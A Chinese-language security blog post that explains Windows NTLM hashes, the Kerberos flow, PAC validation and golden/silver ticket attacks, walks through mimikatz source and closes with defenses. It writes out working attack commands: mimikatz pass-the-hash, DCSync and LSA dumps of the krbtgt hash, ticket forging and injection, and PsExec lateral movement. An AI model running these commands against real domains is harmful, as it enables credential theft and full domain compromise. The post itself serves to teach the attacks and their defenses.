---
layout: post
title:  "调戏地狱三头犬 Kerberos"
date:   2019-01-24 16:10:01 +0800
categories: Windows
---

* content
{:toc}


## 0x00 前言

本文主要介绍一些 Kerberos 协议的原理和围绕其展开的攻防研究，针对黄金/白银票据如何工作的细节进行了一些研究。

最初的 Kerberos 协议是由 MIT 制定的，很多系统在实现过程中有不同的细节，如 Windows Kerberos 认证协议中就新增了 PAC 认证这一块，需要特别注意。

本文主要是以 Windows Kerberos 的实现为主，但查阅资料时可能会有部分细节来源自 MIT 的标准，若有纰漏还望读者包涵指正。

## 0x01 NTHash 和 Net-NTLM 

在介绍Kerberos协议之前，先简单介绍一下 windows 本地存储密码机制的相关知识。

### NTHash（A.K.A  NTLM）

在 Windows中， 存储的密码Hash就叫做 **NTHash**，也叫做 **NTLM**，其中NTLM 全称是 “NT LAN Manager”，**NTHash** 是通过对密码明文进行十六进制和unicode转换，然后md4算法运算后得到（算法表示为*MD4(UTF-16-LE(password))* ）。这个 NTHash 就是存在 SAM 数据库里，能够直接被 mimikatz 抓取的 hash，也存在域控的 NTDS 文件中，使用这个 hash 可以直接进行 pass-the-hash 攻击。

### Net-NTLMv2

这是一种网络认证协议，其使用 NTHash 为基础，基于 challenge/response 的机制来实现服务端和客户端的双方认证。在局域网或者域中，经常会使用 **Net-NTLM** 协议来进行认证，大概流程如下：

1. Client 向 Server端发送请求，要求使用 Tom 用户进行认证。
2. Server 端收到后，生成一个随机字符串C，使用 Tom 账号的 **NTHash** 对C加密。将未加密的C发送给 Client。
3. Client 收到C后，用 Tom 的 **NTHash** 对C 加密，然后发送给 Server。
4. Server 收到后，验证两边加密的结果是否相等，相等就表示通过。

通过这样的认证流程，就能够在不发送用户密码明文和Hash的情况下进行认证了。


通过 Responder 等工具抓取流量获取到的 hash 是 Net-NTLM 加密过后的hash，这类hash不能直接用来进行 pass-the-hash 攻击，但是可以用来进行重放攻击，也存在暴力破解的可能性。具体原因可以参考上面的流程。


## 0x02 Pass The Hash

通过对上面原理的介绍，我们发现，即使不能获取到某个账号的明文密码，仅仅获取NTLM Hash也是大有可为的。一旦获取了某个账号的NTLM Hash，我们就能够进行 Pass The Hash 攻击（PTH）。

**Pass The Hash 攻击** 

- Metasploit ( *exploit/windows/smb/psexec, tools/exploit/psexec.rb* )
- Psexec.exe
- mimikatz

```
mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
user    : Administrateur
domain  : chocolate.local
program : cmd.exe
NTLM    : cc36cf7a8514893efccd332446158b1a
  |  PID  712
  |  TID  300
  |  LUID 0 ; 362544 (00000000:00058830)
  \_ msv1_0   - data copy @ 000F8AF4 : OK !
  \_ kerberos - data copy @ 000E23B8
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ des_cbc_md5       -> null
   \_ des_cbc_crc       -> null
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace -> null
```





## 0x03 Kerberos 协议简介

Kerberos 协议认证的原理和上述提到的 NTLM 有很多类似的地方，下面简单介绍一下Kerberos 的认证流程。

![/styles/images/kerberos/kerberos_01.png]({{ '/styles/images/kerberos/kerberos_01.png' | prepend: site.baseurl }}) 



1. （**AS-REQ**）Client 发送用户名 Tom 到 KDC （Key Distribution Center）以向 AS （Authentication Service）请求 TGT 票据等信息。

2. （**AS-REP**）收到请求后，AS 生成随机字符串 Session Key，使用 Tom 的 NTLM Hash 对 Session Key 加密得到密文 A，再使用账号 krbtgt 的 NTLM Hash 对 Session Key 、 Client Info和 timestamp 加密得到 TGT，A 和 TGT 一起返回给 Client。

3. （**TGS-REQ**） Client 收到请求后，使用自身的 NTLM Hash 解密 A 就能得到 Session Key，然后使用 Session Key 对 Client Info 和 timestamp 加密得到 B，加上 TGT ，发送给 KDC中的 TGS。

4. （**TGS-REP**）TGS  收到请求后，使用 **krbtgt** 的 NTLM Hash 解密 TGT，得到 Session Key 和 timestamp 以及 Client Info，同时，使用 TGT 解密出的 Session Key 解密密文B，得到Client Info 和 timestamp。 比对这两部分解密得到的内容以验证是否通过。通过后，生成一个新的随机数 Session Key2，并用它加密 client info 和 timestamp 得到密文 enc-part；使用服务器计算机的NTLM Hash 对 session key2 和 client info 以及 timestamp 加密得到最终的 Ticket，返回给 Client。

5. （**AP-REQ**）Client 使用 Ticket 和 enc-part 直接请求某服务。

6. （**AP-REP**） 对Ticket 和 enc-part 解密后进行验证授权。

**注意**：

- Kerberos 协议设计的思路就是用来在不受信的环境下进行认证的协议。

- krbtgt 账号的 NTLM Hash 理论上只存在于 KDC 中。这意味着 TGT 只能由 KDC 来解密。如果krbtgt 账号的NTLM Hash泄露了，那么 TGT 就能被解密甚至伪造。伪造的 TGT 叫做黄金票据。

- Ticket 是由服务器计算机本身的 NTLM Hash 加密的，Client 不能解密。如果该Hash 泄露，那么就可以解密甚至伪造 Ticket。伪造的 Ticket 叫做白银票据。

- 在上述的流程中，涉及到时间戳 timestamp，由于它的存在，才使得被第三方获取了加密信息 A 、B、TGT不会在短时间内被暴力破解。timestamp 一般时间为8小时。

- Kerberos 协议和 NTLM 协议都会使用 NTLM Hash 对生成的任意随机数加密，然后比对结果。 Kerberos 的主要区别在于添加了第三方-------KDC参与到认证过程中。

- Client info 中包含域名信息、Client 名称等



## 0x04 Kerberos PAC 验证

PAC（*Privilege Account Certificate*）是用来验证数据合法性的一个扩展功能，它被包含在 Kerberos Ticket 中以一个数据结构体存在。 PAC 结构体包含安全标识符，组成员身份，用户配置文件信息和密码凭据等信息。PAC 验证的目的是为了解决 PAC 欺骗，防止攻击者利用篡改的 PAC 信息实现未授权访问。

下图显示了Kerberos PAC 认证过程。

  ![/styles/images/kerberos/pac.png]({{ '/styles/images/kerberos/pac.png' | prepend: site.baseurl }}) 



默认情况下 PAC 验证是不开启的，开启后会增加一些网络和性能上的消耗。

MS14-068 漏洞，就是基于 PAC 认证的错误，从而导致域内普通用户可以伪造凭据，从而提权到管理员权限。



## 0x05 Pass The Ticket

### 黄金票据（Gold Ticket）

攻击者在获取了 krbtgt 账号的 ntlm hash 后，就能自己任意伪造 TGT（包括session key，client info等内容），然后直接发送给 kdc，实现任意权限伪造。	

![/styles/images/kerberos/goldticket.png]({{ '/styles/images/kerberos/goldticket.png' | prepend: site.baseurl }}) 

**伪造黄金票据所需信息**

- 目标的域名信息（如：vln2012.local)
- 目标域名的 SID （可通过 `lsadump::lsa` 获取）
- 伪造的账号名称（如： Administrator）
- 伪造账号的 RID （RID 是 SID 最右边的一部分，默认的 Administrator 账号的 RID 是 500）
- 伪造账号所属组的 RIDs （如 `Domain Users` 和 `Domain Admins` 的RIDs 分别是 512 和 513）
- 一个或者多个 krbtgt 账号的 Hash （如： RC4 加密的 NTLM Hash，AES-128 HMAC 、AES-256 HMAC）

**伪造黄金票据的方法和工具**

首先需要获取 krbtgt 账号的 hash，常用的方法如下：

- DCSync (mimikatz)

mimikatz 会模拟域控，向目标域控请求账号密码信息。 这种方式动静更小，不用直接登陆域控，也不需要提取NTDS.DIT文件。需要域管理员或者其他类似的高权限账户。

```shell
lsadump::dcsync /user:krbtgt
```

或者在 meterpreter 中使用 kiwi 扩展

```
dcsync_ntlm krbtgt
```

- LSA(mimikatz)

mimikatz 可以在域控的本地安全认证(Local Security Authority)上直接读取

```
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

- Hashdump(Meterpreter)

 ![/styles/images/kerberos/meterpreter-hashdump.png]({{ '/styles/images/kerberos/meterpreter-hashdump.png' | prepend: site.baseurl }}) 

- ntds.dit

将域控中的数据库 ntds.dit 复制出来使用其他工具解析，需要注意有时候这个 ntds.dit 是非常大的。



伪造黄金票据：

Mimikatz

```
mimikatz # kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
User      : utilisateur
Domain    : chocolate.local
SID       : S-1-5-21-130452501-2365100805-3685010670
User Id   : 1107
Groups Id : *513
krbtgt    : 310b643c5316c8c3c70a10cfb17e2e31 - rc4_hmac_nt
Lifetime  : 15/08/2014 01:57:29 ; 12/08/2024 01:57:29 ; 12/08/2024 01:57:29
-> Ticket : utilisateur.chocolate.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```



Meterpreter

```
golden_ticket_create -d chocolate.local -u utilisateur -s S-1-5-21-130452501-2365100805-3685010670
-k 310b643c5316c8c3c70a10cfb17e2e31 -t utilisateur.chocolate.kirbi
```



注入当前用户内存中：

Mimikatz

```
kerberos::ptt utilisateur.chocolate.kirbi
```

Meterpreter

```
kerberos_ticket_use utilisateur.chocolate.kirbi
```

查看内存中的 ticket

```
kerberos::list
kerberos::tgt
kerberos_ticket_list # meterpreter
```

访问域内其他服务器

```
dir \\WIN-PTELU2U07KG\C$
```

**注意**：如果使用 IP 地址访问的话会失败，使用 Netbios 的服务名访问才会走 Kerberos 协议（具体原因可以比较两协议的原理得出）。



通过 psexec 执行命令

```
PsExec64.exe \\WIN-PTELU2U07KG\ cmd.exe
```

理论上也可以使用 powershell、wmic 来远程执行命令。



**黄金票据的特点**

- 黄金票据可以冒充域内任何用户生成对应的 Kerberos TGT 票证。因此，它可以用来任何合法的用户，虽然一般都会选择域管理员帐户；

- 可以离线创建。一旦收集了创建黄金票据所需的所有数据，就不需要连接到域（参见上面的内容）;
- 在有限期内都有效。Mimikatz 默认值为10年，也提供了参数可以创建任意有效期的黄金票据。但如果域管理员修改了 krbtgt 账户的 Hash， 黄金票据就会立即失效；
- 域组策略中修改 Kerberos Policy 中的生存周期（lifetime）不会影响到黄金票据（默认更新时间为10小时，总有效时间为7天）。KDC 会验证 TGT 中的存活时间戳，而不是域控上的组策略设置。攻击者生成任何生存周期的黄金票据;
- 被冒充的帐户重置密码不会影响到黄金票据；
- 重置 krbtgt 账号的密钥会使所有的黄金票据失效；
- Windows 事件日志不区分合法TGT与黄金票据。 因此目前没有通用的规则来检测黄金票据使用。



### 白银票据 （Silver Ticket）

通过获取 Server 端本地计算机账户（或服务账号）对应的 NTLM Hash，在不用与 KDC 进行通信的情况下，就能伪造该计算机任意服务的 Ticket。



![/styles/images/kerberos/silverticket.png]({{ '/styles/images/kerberos/silverticket.png' | prepend: site.baseurl }}) 



**伪造白银票据所需的信息：**

- 目标的域名信息（如：*example.domain.local*)
- 目标域名的 SID （可通过 `lsadump::lsa` 获取）
- 伪造的账号名称（如： *Administrator*）
- 目标计算机账号（或对应服务账号，如 *MS SQL*）的 Hash 
- 目标服务器的 FQDN（Fully Qualified Domain Name，如 *adsmswin2k8r2.example.domain.local*）



**伪造白银票据的方法和工具**

mimikatz

```
mimikatz “kerberos::golden /admin:Administrator /id:500 /domain:example.domain.local /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.example.domain.local /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
```

使用和其他功能同黄金票据。



### 黄金、白银票据的差异

- 黄金票据伪造的是 TGT，白银票据伪造的是 Ticket；黄金票据是在 Kerberos 协议中的第三步（TGS-REQ）开始，而白银票据是从第五步（AP-REQ）开始。两者伪造的信息和伪造的步骤都不同。
- 黄金票据需要与 KDC 通信，而白银票据不需要。
- 黄金票据需要 krbtgt 账号的 NTLM Hash，而白银票据需要的是目标计算机对应的账号或对应服务账号的 NTLM Hash。
- 白银票据需要指定目标服务/计算机的路径（如 *adsmswin2k8r2.example.domain.local*），以及对应的服务名（如 *cifs*, *rpcss*, *http*, *mssql*）。
- 白银票据只对指定计算机上的指定服务生效，局限性比较大。



### PTT 的一些实现细节

可以看到在生成黄金票据的时候，mimikatz 会提示生成了好几部分内容，这些提示我试图查找一些资料，都没有找到现成的解释，于是都去翻了翻 mimikatz 的源码试图找到合理的解释。

在 [kuhl_m_kerberos.c #508](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c#L508) 处的 `kuhl_m_kerberos_golden_data` 函数，是负责生成黄金票据信息的主要函数，可以看到有相关的一些参数。

继续查看该函数实现的定义，如下

```

	if(sid) // we want a PAC !
	{
		if(pValidationInfo = kuhl_m_pac_infoToValidationInfo(&lifetime->TicketStart, username, domainname, LogonDomainName, sid, userid, groups, cbGroups, sids, cbSids))
		{
			if(kuhl_m_pac_validationInfo_to_PAC(pValidationInfo, NULL, NULL, SignatureType, pClaimsSet, &pacType, &pacTypeSize))
			{
				kprintf(L" * PAC generated\n");
				status = kuhl_m_pac_signature(pacType, pacTypeSize, SignatureType, key, keySize);
				if(NT_SUCCESS(status))
					kprintf(L" * PAC signed\n");
			}
		}
	}

	if(!sid || NT_SUCCESS(status))
	{
		if(BerApp_EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(&ticket, pacType, pacTypeSize))
		{
			kprintf(L" * EncTicketPart generated\n");
			status = kuhl_m_kerberos_encrypt(keyType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, keySize, BerApp_EncTicketPart->bv_val, BerApp_EncTicketPart->bv_len, (LPVOID *) &ticket.Ticket.Value, &ticket.Ticket.Length, TRUE);	
			if(NT_SUCCESS(status))
			{
				kprintf(L" * EncTicketPart encrypted\n");
				if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(&ticket, FALSE))
					kprintf(L" * KrbCred generated\n");
				LocalFree(ticket.Ticket.Value);
			}
			else PRINT_ERROR(L"kuhl_m_kerberos_encrypt %08x\n", status);
			ber_bvfree(BerApp_EncTicketPart);
		}
	}
```

一共分成三部分，分别是

- 生成PAC并对其签名
- 生成并加密EncTicketPart
- 生成最终的TGT

**生成和签名PAC**

可以看到是先通过函数 `kuhl_m_pac_infoToValidationInfo`（这些信息包括 *LogoffTime, PasswordLastSet, PasswordMustChange* 等） 和 `kuhl_m_pac_validationInfo_to_PAC` 生成验证信息并转化为PAC 结构，然后用 `kuhl_m_pac_signature` 函数对其签名，PAC 信息就生成完毕，代码见 [kuhl_m_kerberos_pac.c#L146](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_pac.c#L146) 。

**生成和加密EncTicketPart**

接下来使用函数`kuhl_m_kerberos_ticket_createAppEncTicketPart` （参考 [kuhl_m_kerberos_ticket.c#L250](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ticket.c#L250)）生成 EncTicketPart，这个EncTicketPart就是是组成 TGT 的重要组成部分，TGT 的详细组成后面会讲。

查看一下该函数的实现细节如下（部分代码）：

```
{% raw %}
		ber_printf(pBer, "t{{t{", MAKE_APP_TAG(ID_APP_ENCTICKETPART), MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_FLAGS));
		kull_m_asn1_BitStringFromULONG(pBer, ticket->TicketFlags);
		ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_KEY));
		kuhl_m_kerberos_ticket_createSequenceEncryptionKey(pBer, ticket->KeyType, ticket->Key.Value, ticket->Key.Length);
		ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_CREALM));
		kull_m_asn1_GenString(pBer, &ticket->AltTargetDomainName);
		ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_CNAME));
		kuhl_m_kerberos_ticket_createSequencePrimaryName(pBer, ticket->ClientName);
		ber_printf(pBer, "}t{{t{i}t{o}}}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_TRANSITED), MAKE_CTX_TAG(ID_CTX_TRANSITEDENCODING_TR_TYPE), 0, MAKE_CTX_TAG(ID_CTX_TRANSITEDENCODING_CONTENTS), NULL, 0, MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_AUTHTIME));
		kull_m_asn1_GenTime(pBer, &ticket->StartTime);
		ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_STARTTIME));
		kull_m_asn1_GenTime(pBer, &ticket->StartTime);
		ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_ENDTIME));
		kull_m_asn1_GenTime(pBer, &ticket->EndTime);
		ber_printf(pBer, "}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_RENEW_TILL));
		kull_m_asn1_GenTime(pBer, &ticket->RenewUntil);
		ber_printf(pBer, "}"); /* ID_CTX_ENCTICKETPART_CADDR not present */
{% endraw %}
```

可以看到一些该部分是由 *ID_CTX_ENCTICKETPART_FLAGS,  ID_CTX_ENCTICKETPART_KEY, ID_CTX_ENCTICKETPART_CREALM* 等信息组成的，这就是 EncTicketPart 的主要组成结构（参考 [RFC4120](https://tools.ietf.org/html/rfc4120#section-5.8)）。

在生成完 EncTicketPart 之后，需要使用之前生成的随机的 Session Key 对其加密（本来 Session Key 是由 KDC 协商的，因为这里是伪造的，所以是本地生成）。实现的函数是`kuhl_m_kerberos_encrypt`。

**生成最终的TGT**

然后是`kuhl_m_kerberos_ticket_createAppKrbCred` 函数创建最终的TGT（参考 [kuhl_m_kerberos_ticket.c#L196](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ticket.c#L196)），Ticket的结构如下：

```
Ticket          ::= [APPLICATION 1] SEQUENCE {
        tkt-vno         [0] INTEGER (5),
        realm           [1] Realm,
        sname           [2] PrincipalName,
        enc-part        [3] EncryptedData -- EncTicketPart
}
```

创建完之后，将伪造的黄金票据注入到内存中，使用 `kuhl_m_kerberos_ptt_data` 函数（参考），该函数先将伪造的黄金票据复制到内存中，然后调用`LsaCallAuthenticationPackage` 函数来解析缓存中的认证信息，验证是否可用。



## 0x06 防御

### 保护域控和敏感账户

- 限制域管理员和其他高权限账户登陆低信任程度的服务器。
- 给管理员提供专门的高权限用户来进行管理操作，与日常使用的普通权限用户区分开。
- 使用专门的工作站来进行管理任务。
- 在域环境中，将特权账户标记为敏感且不能委派（sensitive and cannot be delegated）。
- 不要使用高权限的域账号在不受信任的系统（如个人电脑）上配置服务或者计划任务。

**小结**： 如果从未在被入侵的计算机上登陆过高权限账户，那么攻击者无法窃取高权限账号的信息。这些措施可以明显增高攻击者危害高权限账户的攻击成本。

### 重置 krbtgt 账号密码

重置该账号密码可以使得所以所有生成的黄金票据立即失效，可能会导致一些手动输入密码的服务失效，同时造成短时间内域控的负载增大。

### 开启 PAC 验证

开启 PAC 验证，但会增加 KDC 的压力。

### 检测

gentilkiwi 写了一个 yara 规则用来检测 dump hash 的相关，见 [kiwi_passowrds.yar](https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar)



## 0x07 参考链接

https://www.secpulse.com/archives/94848.html

http://cert.europa.eu/static/WhitePapers/CERT-EU-SWP_14_07_PassTheGolden_Ticket_v1_1.pdf

https://tools.ietf.org/html/rfc4120#section-5.8

http://www.securityandit.com/network/kerberos-protocol-understanding/

https://github.com/gentilkiwi/mimikatz

https://en.wikipedia.org/wiki/NT_LAN_Manager

https://blogs.msdn.microsoft.com/openspecification/2009/04/24/understanding-microsoft-kerberos-pac-validation/

https://ldapwiki.com/wiki/Golden%20Ticket

https://pentestlab.blog/2018/04/09/golden-ticket/

https://adsecurity.org/?p=2011

https://download.microsoft.com/download/7/7/a/77abc5bd-8320-41af-863c-6ecfb10cb4b9/mitigating%20pass-the-hash%20(pth)%20attacks%20and%20other%20credential%20theft%20techniques_english.pdf

https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4

